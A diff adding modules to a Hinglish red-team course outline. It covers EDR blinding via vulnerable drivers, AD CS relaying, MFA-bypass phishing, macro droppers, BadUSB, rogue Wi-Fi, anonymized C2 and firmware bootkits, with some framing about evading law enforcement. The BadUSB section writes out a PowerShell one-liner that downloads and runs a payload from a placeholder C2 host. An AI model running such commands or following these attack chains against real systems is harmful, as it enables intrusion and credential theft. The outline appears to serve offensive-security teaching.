@@ -2773,6 +2773,25 @@ Subtopics: ETW Concept, System Telemetry, ntdll.dll, EtwEventWrite, Blue Team Lo
 
 * Live Production Phase: Malware execute hone par pehla step AMSI patch karna hota hai, aur doosra step `EtwEventWrite` ko patch karke `return (0xC3)` set karna hota hai. Iske baad malware jo bhi process banata hai ya network call karta hai, uski telemetry Blue Team ke SIEM dashboard tak pahunchti hi nahi.
 
+Topic 3: Kernel-Level Evasion (BYOVD & PPL Bypass) [⚠️ New]
+Subtopics: Kernel Mode vs User Mode, Ring 0 Execution, Bring Your Own Vulnerable Driver (BYOVD), RTCore64.sys, LSA Protection Bypass, Protected Process Light (PPL), EDR Telemetry Blinding, Driver Signature Enforcement (DSE)
+
+[📊 SCOPE SIGNAL for Topic 3:
+
+* Depth Level: Deep
+* Coverage Angle: Both
+* Notes mein content volume: Explanation of Kernel-level drivers to blind EDRs entirely.
+* Key terms from notes: BYOVD, Ring 0, Kernel, PPL, LSA, Driver Signature Enforcement
+* Explicit emphasis in notes: "User-land evasion (AMSI/ETW) kaafi nahi hai. Apex attackers directly Kernel (Ring 0) mein ghus kar EDR ke process ko andha (blind) kar dete hain."
+]
+
+🔑 KEYWORDS DUMP for Topic 3:
+[BYOVD, Bring Your Own Vulnerable Driver, Ring 0, Kernel mode, RTCore64.sys, Capcom.sys, LSA Protection, LSASS, PPL, Protected Process Light, DSE, Driver Signature Enforcement, EDR blinding, Object callbacks, Process Explorer, KDU, Kernel Driver Utility]
+
+🔄 REAL-WORLD FLOW SIGNAL for Topic 3:
+
+* Live Production Phase: Attacker system par ek officially signed (but vulnerable) ASUS driver (RTCore64.sys) drop karta hai. Implant us driver ke through kernel (Ring 0) memory mein arbitrary read/write exploit run karta hai, aur CrowdStrike/Defender EDR agent ke kernel callbacks ko disable kar deta hai. EDR chalu dikhta hai, par actually andha ho chuka hota hai.
+
 ---
 
 ✅ **Notes Guru ke liye skeleton ready hai. Yeh skeleton original notes ka 100% content preserve karta hai — har Section, har Topic, har keyword, aur har real-world flow signal captured hai.**
@@ -2782,9 +2801,10 @@ Subtopics: ETW Concept, System Telemetry, ntdll.dll, EtwEventWrite, Blue Team Lo
 Section 1: Bypassing Modern Windows Defenses [⚠️ Derived]
 Topic 1: AMSI Bypass (Memory Patching) [⚠️ New]
 Topic 2: ETW Blinding (Event Tracing for Windows) [⚠️ New]
+Topic 3: Kernel-Level Evasion (BYOVD & PPL Bypass) [⚠️ New]
 
 📊 PHASE SUMMARY:
-Sections: 1 | Topics: 2 | Subtopics: 15
+Sections: 1 | Topics: 3 | Subtopics: 23
 
 --- 🛑 PHASE 4 SKELETON READY. Paste the next phase/module notes to continue, OR type 'DONE' if all notes are pasted.
 
@@ -3114,7 +3134,38 @@ Subtopics: Kerberos Protocol Flaws, Kerberoasting, AS-REP Roasting, Golden Ticke
 
 * Live Production Phase: Implant `Rubeus` run karke vulnerable service accounts (SPNs) ke Kerberos tickets request karta hai. Tickets ko C2 par bhej kar offline `Hashcat` se crack kiya jata hai. Password crack hone par attacker us account se `DCSync` attack run karke poore domain ka control le leta hai.
 
-✅ **Notes Guru Skeleton Ready:** Module 25 (Topics 1-2).
+Topic 3: AD CS Abuse & NTLM Relaying (ESC1-ESC8) [⚠️ New]
+Subtopics: Active Directory Certificate Services, PKI Infrastructure, ESC1 to ESC8 Vulnerabilities, Certipy, PetitPotam, Coercion, NTLM Relaying, Shadow Credentials, Pass-the-Certificate
+
+[📊 SCOPE SIGNAL for Topic 3:
+
+* Depth Level: Deep
+* Coverage Angle: Practical
+* Notes mein content volume: Exploiting AD PKI to forge authentication certificates for Domain Admins.
+* Key terms from notes: AD CS, Certificate Services, ESC8, Certipy, NTLM Relay, Coercion
+* Explicit emphasis in notes: "Aaj kal Kerberoasting se zyada AD CS (Certificate Services) misconfigurations exploit hoti hain DA banne ke liye."
+]
+
+🔑 KEYWORDS DUMP for Topic 3:
+[AD CS, Active Directory Certificate Services, PKI, Public Key Infrastructure, ESC1, ESC8, Vulnerable Certificate Templates, Certipy, PetitPotam, Coercion, NTLM Relaying, HTTP endpoints, Shadow Credentials, Pass-the-Certificate, PFX, Kerberos PKINIT, Domain Admin privilege escalation]
+
+🔄 REAL-WORLD FLOW SIGNAL for Topic 3:
+
+* Live Production Phase: Attacker PetitPotam ka use karke Domain Controller ko coerce karta hai ki woh attacker ke IP par NTLM authentication bhej de. Attacker us NTLM auth ko AD CS Web Enrollment HTTP endpoint par relay karta hai aur Domain Controller ke naam par ek valid Certificate (ESC8) issue karwa leta hai. Us certificate se attacker DC ko poori tarah compromise kar leta hai.
+
+---
+
+✅ **Notes Guru Skeleton Ready:** Module 25 (Topics 1-3).
+
+📋 EXTRACTED IN THIS PHASE:
+
+Section 1: Dominating the Windows Domain [⚠️ Derived]
+Topic 1: AD Reconnaissance (BloodHound & LDAP) [⚠️ New]
+Topic 2: Kerberos Attacks (Roasting & Tickets) [⚠️ New]
+Topic 3: AD CS Abuse & NTLM Relaying (ESC1-ESC8) [⚠️ New]
+
+📊 PHASE SUMMARY:
+Sections: 1 | Topics: 3 | Subtopics: 25
 
 ---
 
@@ -3282,4 +3333,265 @@ Subtopics: Instance Metadata Service (IMDSv1 vs IMDSv2), SSRF to Metadata, Steal
 
 ---
 
-🛑 **DONE. The ultimate cross-platform, multi-environment Red Teaming skeleton is fully compiled.**
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+==================================================================================
+
+# Module 29: Initial Access & Payload Delivery
+
+📦 Processing: Phase/Module 29 — Initial Access & Payload Delivery
+
+===Section 1: Bypassing the Front Door (MFA & SmartScreen)===
+Malware banane ke baad use victim ke PC tak safely pahunchana aur execute karwana (Phishing & Droppers).
+
+--29--Initial Access & Payload Delivery--
+Topic 1: Adversary-in-the-Middle (AiTM) Phishing [⚠️ New]
+Subtopics: AiTM Concept, Bypassing 2FA/MFA, Evilginx2, Phishlets, Session Cookie Theft, Reverse Proxy Phishing, Token Injection
+
+[📊 SCOPE SIGNAL for Topic 1:
+
+* Depth Level: Deep
+* Coverage Angle: Both
+* Notes mein content volume: How to bypass modern MFA using reverse proxy phishing to deliver the initial payload.
+* Key terms from notes: AiTM, MFA Bypass, Evilginx2, Session Cookie, Phishlets, Reverse Proxy
+* Explicit emphasis in notes: "Aajkal passwords se zyada Session Cookies ki value hai. Bina cookie ke MFA bypass nahi hoga."
+* Notes mein jo analogies/examples the: "Victim ko lagta hai woh real Microsoft login page par hai, par beech mein attacker ka transparent sheesha (proxy) laga hai."
+]
+
+🔑 KEYWORDS DUMP for Topic 1:
+[Initial Access, AiTM, Adversary-in-the-Middle, MFA Bypass, 2FA, Evilginx2, Muraena, Modlishka, Phishlets, Session Cookies, JWT, Authentication Token, Reverse Proxy, Nginx, Let's Encrypt, Spear Phishing, Credential Harvesting, Pass-the-Cookie, Session Hijacking]
+
+🔄 REAL-WORLD FLOW SIGNAL for Topic 1:
+
+* Testing/Offline Phase: Developer local lab mein Evilginx2 setup karke custom phishing domain (e.g., login-microsoft-update.com) par SSL certificate test karta hai.
+* Fixing/Iteration Phase: (N/A)
+* Live Production Phase: Attacker victim ko email bhejta hai. Victim link par click karke ID/Password aur OTP dalta hai. AiTM server real-time mein Microsoft se authenticate hota hai, session cookie capture karta hai, aur victim ko legit portal par redirect kar deta hai jahan usse malicious C# dropper download karne ko kaha jata hai.
+
+Topic 2: Mark-of-the-Web (MotW) Evasion & Smuggling [⚠️ New]
+Subtopics: MotW Concept, Zone.Identifier, SmartScreen Bypass, HTML Smuggling, ISO/VHD Payloads, LNK Shortcut Chains, Zip/Rar Evasion
+
+[📊 SCOPE SIGNAL for Topic 2:
+
+* Depth Level: Deep
+* Coverage Angle: Practical
+* Notes mein content volume: Bypassing Windows SmartScreen blocks when downloading payloads from the internet.
+* Key terms from notes: MotW, Mark-of-the-Web, SmartScreen, HTML Smuggling, ISO, LNK
+* Explicit emphasis in notes: "Internet se download hui har .exe par Windows 'MotW' tag lagata hai. Ise bypass kiye bina payload nahi chalega."
+]
+
+🔑 KEYWORDS DUMP for Topic 2:
+[Mark-of-the-Web, MotW, Zone.Identifier, Alternate Data Stream, ADS, Windows SmartScreen, Defender, HTML Smuggling, JavaScript Blob, base64 decoding in browser, ISO payload, VHD mounting, LNK files, shortcut parameters, .zip, password-protected archive, execution chain, dropper, loader]
+
+🔄 REAL-WORLD FLOW SIGNAL for Topic 2:
+
+* Live Production Phase: Victim phishing link par click karta hai. Browser ke andar JavaScript (HTML Smuggling) locally ek malicious `.zip` file generate karta hai jismein ek `.LNK` file aur hamara hidden C# implant hota hai. ISO ya LNK use karne se MotW bypass ho jata hai aur user ke double-click karte hi payload execute ho jata hai.
+
+Topic 3: Office Macros & VBA Droppers [⚠️ New]
+Subtopics: VBA Macros, AutoOpen, Document_Open, Shellcode execution via VBA, WMI execution via VBA, Obfuscating Macros, Excel/Word Payloads
+
+[📊 SCOPE SIGNAL for Topic 3:
+
+* Depth Level: Moderate
+* Coverage Angle: Practical
+* Notes mein content volume: Legacy but still effective method of executing code via Microsoft Office documents.
+* Key terms from notes: VBA, Macros, AutoOpen, Dropper, Obfuscation
+* Explicit emphasis in notes: "Macros by default disable hote hain, isliye Social Engineering (Enable Content prompt) sabse crucial step hai."
+]
+
+🔑 KEYWORDS DUMP for Topic 3:
+[VBA, Visual Basic for Applications, Macros, AutoOpen, Document_Open, MS Word, MS Excel, Malicious Document, Maldoc, Dropper, Loader, CreateObject, WScript.Shell, VBA Stomping, VBA Purging, Obfuscation, Enable Content, Social Engineering, Phishing attachment]
+
+🔄 REAL-WORLD FLOW SIGNAL for Topic 3:
+
+* Live Production Phase: Attacker ek fake "Invoice.docm" bhejta hai. Document kholne par ek blur image dikhti hai aur upar "Enable Content" click karne ko kaha jata hai. Click karte hi VBA macro run hota hai, jo internet se hamara C# implant (FileDownloader) download karke stealthy mode mein run kar deta hai.
+
+---
+
+✅ **Notes Guru Skeleton Ready:** Module 29 (Topics 1-3).
+
+📋 EXTRACTED IN THIS PHASE:
+
+Section 1: Bypassing the Front Door (MFA & SmartScreen) [⚠️ Derived]
+Topic 1: Adversary-in-the-Middle (AiTM) Phishing [⚠️ New]
+Topic 2: Mark-of-the-Web (MotW) Evasion & Smuggling [⚠️ New]
+Topic 3: Office Macros & VBA Droppers [⚠️ New]
+
+📊 PHASE SUMMARY:
+Sections: 1 | Topics: 3 | Subtopics: 21
+
+---
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+==================================================================================
+
+# Module 30: Physical Red Teaming & Close-Access Operations
+
+📦 Processing: Phase/Module 30 — Physical Access
+
+===Section 1: Hardware-Based Compromise===
+Jab network aur email tightly secured hon, tab target building ke andar ghuskar hardware ke zariye initial access lena.
+
+--30--Physical Red Teaming & Close-Access Operations--
+Topic 1: Keystroke Injection (BadUSB) [⚠️ New]
+Subtopics: HID (Human Interface Device) Spoofing, BadUSB, Rubber Ducky, DuckyScript, Bash Bunny, O.MG Cable, Rapid Execution
+
+[📊 SCOPE SIGNAL for Topic 1:
+
+* Depth Level: Deep
+* Coverage Angle: Practical
+* Notes mein content volume: Writing DuckyScript to inject PowerShell payloads in seconds via USB.
+* Key terms from notes: BadUSB, HID, Rubber Ducky, DuckyScript, Keystroke Injection
+* Explicit emphasis in notes: "Antivirus USB mass storage ko block kar sakta hai, par keyboard (HID) ko hamesha trust karta hai."
+]
+
+🔑 KEYWORDS DUMP for Topic 1:
+[Physical Red Teaming, Close-Access, BadUSB, Hak5, USB Rubber Ducky, Bash Bunny, O.MG Cable, HID Spoofing, Human Interface Device, Keystroke Injection, DuckyScript, DELAY, STRING, GUI r, Blind execution, bypassing endpoint controls, PowerShell one-liner, physical breach]
+
+🔄 REAL-WORLD FLOW SIGNAL for Topic 1:
+
+* Live Production Phase: Red Teamer target office mein ghusta hai. Kisi unlocked unattended PC mein BadUSB plug karta hai. USB khud ko ek "Keyboard" ki tarah register karta hai aur 3 seconds ke andar `Win+R -> powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString('http://C2/payload')"` type karke enter maar deta hai. Implant background mein chalu ho jata hai aur attacker USB nikal kar nikal jata hai.
+
+Topic 2: Wireless & Rogue Access Points [⚠️ New]
+Subtopics: Wi-Fi Reconnaissance, WPA2/WPA3 Enterprise, Evil Twin Attack, EAP Downgrade, Captive Portals, Wi-Fi Pineapple
+
+[📊 SCOPE SIGNAL for Topic 2:
+
+* Depth Level: Moderate
+* Coverage Angle: Conceptual
+* Notes mein content volume: Setting up rogue access points to capture corporate AD credentials over Wi-Fi.
+* Key terms from notes: Evil Twin, Rogue AP, WPA Enterprise, Captive Portal
+* Explicit emphasis in notes: "Corporate Wi-Fi (WPA2-Enterprise) seedha Active Directory se juda hota hai. Isko hack karna matlab domain hack karna."
+]
+
+🔑 KEYWORDS DUMP for Topic 2:
+[Wi-Fi Hacking, Rogue AP, Access Point, Evil Twin, Hak5 Wi-Fi Pineapple, WPA2 Enterprise, WPA3, 802.1x, RADIUS, EAP-TLS, PEAP, Downgrade attack, Captive Portal phishing, Aircrack-ng, Wifite, Karma attack, Handshake capture, PMKID, credential harvesting over air]
+
+🔄 REAL-WORLD FLOW SIGNAL for Topic 2:
+
+* Live Production Phase: Attacker company ke parking lot mein baith kar Wi-Fi Pineapple on karta hai aur "Corporate_Guest" naam ka ek Rogue AP banata hai. Employees ke phone auto-connect hote hain, aur ek fake portal unhe apna Windows/AD login dalne ko kehta hai. Attacker ko bina building mein ghuse valid credentials mil jate hain.
+
+---
+
+✅ **Notes Guru Skeleton Ready:** Module 30 (Topics 1-2).
+
+📋 EXTRACTED IN THIS PHASE:
+
+Section 1: Hardware-Based Compromise [⚠️ Derived]
+Topic 1: Keystroke Injection (BadUSB) [⚠️ New]
+Topic 2: Wireless & Rogue Access Points [⚠️ New]
+
+📊 PHASE SUMMARY:
+Sections: 1 | Topics: 2 | Subtopics: 13
+
+---
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+==================================================================================
+
+# Module 31: OPSEC & Automated Infrastructure (Red Team DevOps)
+
+📦 Processing: Phase/Module 31 — Infrastructure OPSEC
+
+===Section 1: Untraceable C2 Infrastructure===
+Blue team/Law enforcement se bachne ke liye disposable aur highly anonymized servers setup karna.
+
+--31--OPSEC & Automated Infrastructure--
+Topic 1: Infrastructure as Code (Terraform & Ansible) [⚠️ New]
+Subtopics: Red Team DevOps, Terraform, Ansible, Disposable Infrastructure, Automated VPS Deployment, Rapid Rebuilds
+
+[📊 SCOPE SIGNAL for Topic 1:
+
+* Depth Level: Moderate
+* Coverage Angle: Practical
+* Notes mein content volume: Writing scripts to automate the deployment of Apache, MySQL, and C2 panels in 2 minutes.
+* Key terms from notes: Terraform, Ansible, IaC, Disposable, VPS
+* Explicit emphasis in notes: "Ek professional attacker apna C2 server manually click karke nahi banata. Agar server burn (block) ho jaye, toh naya server script ke zariye 2 minute mein ready hona chahiye."
+]
+
+🔑 KEYWORDS DUMP for Topic 1:
+[Infrastructure as Code, IaC, Red Team DevOps, Terraform, .tf files, Ansible, Playbooks, Automated deployment, DigitalOcean API, AWS EC2, Disposable infrastructure, Burned IP, fast flux, proxy chains, Server provisioning, OPSEC, Operational Security, resilience]
+
+🔄 REAL-WORLD FLOW SIGNAL for Topic 1:
+
+* Live Production Phase: Blue Team attacker ka IP block kar deti hai. Attacker apna local `terraform apply` script chalata hai. AWS par naya server banta hai, Ansible uspe Apache aur C2 panel install karta hai, aur DNS records update ho jate hain. 5 minute ke andar naya C2 live ho jata hai aur implants nayi IP par ping karne lagte hain.
+
+Topic 2: Ultimate Anonymity (Tor & Hidden Services) [⚠️ New]
+Subtopics: The Onion Router (Tor), Hidden Services (.onion), Reverse Proxy over Tor, E2E Encryption, Anonymizing Attacker Location
+
+[📊 SCOPE SIGNAL for Topic 2:
+
+* Depth Level: Deep
+* Coverage Angle: Conceptual & Practical
+* Notes mein content volume: Routing C2 traffic over the Tor network to completely hide the attacker's server location.
+* Key terms from notes: Tor, .onion, Hidden Service, Anonymity, OPSEC
+* Explicit emphasis in notes: "Agar C2 server ka IP public internet par hai, toh uski hosting company tak pahuanch kar use takedown kiya ja sakta hai. Tor Hidden Services IP expose hi nahi karte."
+]
+
+🔑 KEYWORDS DUMP for Topic 2:
+[Tor network, The Onion Router, Hidden Services, .onion domains, Anonymity, OPSEC, Untraceable, Dark Web C2, End-to-End Encryption, Tor proxy, torrc, socat, Proxychains, IP obscuration, Takedown resistance, Law Enforcement Evasion, Bulletproof hosting]
+
+🔄 REAL-WORLD FLOW SIGNAL for Topic 2:
+
+* Live Production Phase: Attacker apna C2 panel kisi random local server par host karta hai aur usme Tor install karke ek `.onion` hidden service banata hai. Victim machine ka C# implant `Socks5` proxy ya Tor2Web gateways ka use karke us `.onion` address par beacon karta hai. Blue team network logs mein sirf Tor traffic dekhti hai, par yeh nahi jaan paati ki C2 server aakhir physical duniya mein kahan rakha hai.
+
+---
+
+✅ **Notes Guru Skeleton Ready:** Module 31 (Topics 1-2).
+
+📋 EXTRACTED IN THIS PHASE:
+
+Section 1: Untraceable C2 Infrastructure [⚠️ Derived]
+Topic 1: Infrastructure as Code (Terraform & Ansible) [⚠️ New]
+Topic 2: Ultimate Anonymity (Tor & Hidden Services) [⚠️ New]
+
+📊 PHASE SUMMARY:
+Sections: 1 | Topics: 2 | Subtopics: 11
+
+---
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+==================================================================================
+
+# Module 34: Hypervisor-Level Attacks & Firmware Implants
+
+📦 Processing: Phase/Module 34 — Firmware Implants
+
+===Section X: Ultimate Persistence (Firmware & Boot)===
+Operating System se bhi neeche (Ring -1) jakar aisi persistence banana jo OS format hone ke baad bhi zinda rahe.
+
+--34--Hypervisor-Level Attacks & Firmware Implants--
+Topic 1: UEFI/BIOS Bootkits & Rootkits (Ring -1) [⚠️ New]
+Subtopics: Boot Process Overview, UEFI vs Legacy BIOS, SPI Flash Modification, SMM (System Management Mode), Bootkits, Hypervisor-level Rootkits, Secure Boot Bypass
+
+[📊 SCOPE SIGNAL for Topic 1:
+
+* Depth Level: Deep
+* Coverage Angle: Conceptual
+* Notes mein content volume: Understanding how APTs implant malware into the motherboard firmware.
+* Key terms from notes: UEFI, Bootkit, SPI Flash, SMM, Secure Boot, Ring -1
+* Explicit emphasis in notes: "Jab persistence hard drive par nahi, motherboard ki SPI flash chip par ho, toh hard drive format karne se bhi malware delete nahi hota."
+]
+
+🔑 KEYWORDS DUMP for Topic 1:
+[UEFI, BIOS, Bootkit, Rootkit, Ring -1, Ring 0, Hypervisor, SPI Flash, SMM, System Management Mode, DXE Phase, Secure Boot bypass, BlackLotus, LoJax, Firmware implants, Chipsec, Hardware persistence, NVRAM]
+
+🔄 REAL-WORLD FLOW SIGNAL for Topic 1:
+
+* Live Production Phase: APT actor SYSTEM privileges gain karne ke baad motherboard ki SPI flash memory ko re-write karta hai (e.g., LoJax/BlackLotus bootkit). Ab agar target apna laptop format bhi kar de aur naya Windows daal le, toh bhi boot hote waqt UEFI firmware pehle malware load karega aur C2 connection wapas establish kar dega.
+
+---
+
+✅ **Notes Guru Skeleton Ready:** Module 34 (Topic 1).
+
+📋 EXTRACTED IN THIS PHASE:
+
+Section X: Ultimate Persistence (Firmware & Boot) [⚠️ Derived]
+Topic 1: UEFI/BIOS Bootkits & Rootkits (Ring -1) [⚠️ New]
+
+📊 PHASE SUMMARY:
+Sections: 1 | Topics: 1 | Subtopics: 7
+
+--- 🛑 DONE. All phases and advanced modules are complete. The ultimate cross-platform, multi-environment Red Teaming skeleton is fully compiled.
